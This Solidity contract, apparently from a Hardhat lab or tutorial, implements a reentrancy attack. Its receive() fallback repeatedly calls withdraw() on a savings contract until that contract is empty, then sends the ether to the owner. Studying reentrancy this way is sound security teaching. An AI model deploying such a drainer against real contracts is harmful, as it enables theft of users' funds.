// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;

import "@openzeppelin/contracts/access/Ownable.sol";
import "hardhat/console.sol";

interface ISavingAccount {
  function deposit() external payable;

  function withdraw() external;
}

contract InvestorV2 is Ownable {
  ISavingAccount public immutable savingsAccount;

  constructor(address savingsAccountAddress) {
    savingsAccount = ISavingAccount(savingsAccountAddress);
  }

  function depositIntoSavingsAccount() external payable onlyOwner {
    savingsAccount.deposit{ value: msg.value }();
  }

  function withdrawFromSavingsAccount() external onlyOwner {
    savingsAccount.withdraw();
  }

  function attack() external payable onlyOwner {
    savingsAccount.deposit{ value: msg.value }();
    savingsAccount.withdraw();
  }

  receive() external payable {
    if (address(savingsAccount).balance > 0) {
      console.log("savingsAccount balance: ", address(savingsAccount).balance);
      savingsAccount.withdraw();
    } else {
      payable(owner()).transfer(address(this).balance);
    }
  }
}